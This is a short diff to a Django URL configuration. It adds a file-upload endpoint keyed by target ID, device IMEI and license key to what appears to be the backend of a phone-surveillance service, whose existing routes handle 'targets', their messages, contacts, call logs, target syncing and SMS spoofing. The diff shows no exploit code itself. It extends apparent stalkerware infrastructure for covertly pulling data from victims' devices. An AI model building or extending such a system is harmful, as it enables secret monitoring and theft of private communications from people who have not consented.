@@ -1,7 +1,7 @@
 from django.urls import path
 from .views import (SigninView, SignUpView,
                     VerifyEmailView, ProfileView, TargetsView, MessagesView, SyncTargetView, SpoofSMSView, ContactsView, CallLogsView)
-from .apis import ConnectTargetView, SyncCallbackView
+from .apis import ConnectTargetView, SyncCallbackView, UploadFilesView
 
 urlpatterns = [
     path("signin/", SigninView.as_view(), name="signin"),
@@ -20,4 +20,6 @@ urlpatterns = [
     path("spoof-sms/", SpoofSMSView.as_view(), name="spoof-sms"),
     path("contacts/", ContactsView.as_view(), name="contacts"),
     path("call-logs/", CallLogsView.as_view(), name="call-logs"),
+     path("upload/<str:target_id>/<str:device_imei>/<str:license_key>/",
+           UploadFilesView.as_view(), name="upload-files"),
 ]
